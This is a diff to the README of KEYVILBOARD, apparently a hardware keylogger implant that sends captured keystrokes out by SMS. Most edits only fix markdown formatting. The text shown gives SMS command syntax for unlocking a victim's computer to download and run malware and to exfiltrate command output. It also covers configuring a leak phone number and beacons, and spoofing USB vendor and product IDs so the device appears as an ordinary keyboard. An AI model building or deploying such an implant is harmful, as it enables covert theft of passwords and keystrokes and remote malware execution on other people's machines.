@@ -42,7 +42,8 @@ The KEYVILBOARD SMS module is thé hardware keylogger for long during operations
    - This feature is independant and doesn't need a keyboard connected to the keylogger.
    - It includes a autorun payload option (AUTORUN in globals.h).
    
-```UnlockDownload##os##password##url    // Unlock the computer to download and execute malware
+```
+UnlockDownload##os##password##url    // Unlock the computer to download and execute malware
 		[os: lnx, win, osx, winlnx, multi]
 			Ex: UnlockDownload##lnx##password##url
 		
@@ -51,7 +52,8 @@ UnlockRunAndExfil##os##password##command  // Unlock the computer to download and
 		
 Manual##Action##Argument
 		[Action=press,print,delay,release]
-			Example: +CMT: Manuall##press##83 72 (in hex)```
+			Example: +CMT: Manuall##press##83 72 (in hex)
+```
 
 			
 5. Automatic keyboard language layout gathering. This is a full new feature developped by Yago Hansen and is under testing now.
@@ -75,7 +77,7 @@ Manual##Action##Argument
 
 * SIM Orientation
 
-     ![Look at the SIM corner](./img/IMG_20190716_192137.jpg)
+	![Look at the SIM corner](./img/IMG_20190716_192137.jpg)
   
 
 2. KEYVILBOARD Setup
@@ -89,7 +91,8 @@ Manual##Action##Argument
 
 1. Modify buffer size in Android library:
 
-```find . -name SoftwareSerial.h
+```
+find . -name SoftwareSerial.h
 
  $ nano /opt/arduino-1.8.3/hardware/arduino/avr/libraries/SoftwareSerial/src/SoftwareSerial.h
 
@@ -103,7 +106,8 @@ Manual##Action##Argument
 
 2. Create your own configuration parameters editing globals.h
 
-```#define LEAK_PHONE_NUMBER "+34nnnnnnnnn"	// Set to the destination phone number
+```
+#define LEAK_PHONE_NUMBER "+34nnnnnnnnn"	// Set to the destination phone number
 #define IMPLANT_NAME "KeyVL1"				// Identify device when multiple used			
 
 #define BEACON true                // Un-comment to send beacons every BEACON_TIME 
@@ -133,7 +137,8 @@ Manual##Action##Argument
 4. Modifying arduino device library (comment and copy the original VID/PID lines)
 	For example, I will spoof VID 2341/PID 8036 (Arduino Leonardo) by VID 03f9/PID 0102 (Standard Keyboard)
     
-```nano /opt/arduino-1.8.3/hardware/arduino/avr/boards.txt
+```
+nano /opt/arduino-1.8.3/hardware/arduino/avr/boards.txt
 		#leonardo.vid.3=0x2A03
 		#leonardo.pid.3=0x8036
 		leonardo.vid.3=0x03f9
@@ -150,7 +155,8 @@ Manual##Action##Argument
 		leonardo.build.usb_product="Standard Keyboard"
 		#leonardo.build.board=AVR_MICRO
 		#leonardo.build.core=micro
-		#leonardo.build.variant=keyb```
+		#leonardo.build.variant=keyb
+```
 
 5. Revise file: payloads.cpp and replace VID_2341^&PID_8036 for VID_03f9^&PID_0102
 
@@ -161,7 +167,9 @@ Manual##Action##Argument
 8. Flash your project again to the device.
 
 9. Extract it and insert it again. Run:
-```dmesg:
+
+```
+$ dmesg
 
 [12088.322618] usb 1-1: new full-speed USB device number 50 using xhci_hcd
 [12088.467138] usb 1-1: New USB device found, idVendor=03f9, idProduct=0102
@@ -171,12 +179,14 @@ Manual##Action##Argument
 [12088.467167] usb 1-1: SerialNumber: HIDPCD
 [12088.468629] cdc_acm 1-1:1.0: ttyACM0: USB ACM device
 [12088.471630] input: Unknown Standard Keyboard as /devices/pci0000:00/0000:00:14.0/usb1/1-1/1-1:1.2/0003:03F9:0102.001B/input/input42
-[12088.531047] hid-generic 0003:03F9:0102.001B: input,hidraw0: USB HID v1.01 Keyboard [Unknown Standard Keyboard] on usb-0000:00:14.0-1/input2```
+[12088.531047] hid-generic 0003:03F9:0102.001B: input,hidraw0: USB HID v1.01 Keyboard [Unknown Standard Keyboard] on usb-0000:00:14.0-1/input2
+```
 
 
 
 ## Flashing (verify, compile and upload)
 It's important to kill ModemManager daemon in order to be able to flash the device.
+
 ```# killall ModemManager
 
 Sketch uses 21834 bytes (76%) of program storage space. Maximum is 28672 bytes.
@@ -262,7 +272,8 @@ Reading | ################################################## | 100% 0.17s
 avrdude: verifying ...
 avrdude: 21834 bytes of flash verified
 
-avrdude done.  Thank you.```
+avrdude done.  Thank you.
+```
 
 
 ## Note from the authors:
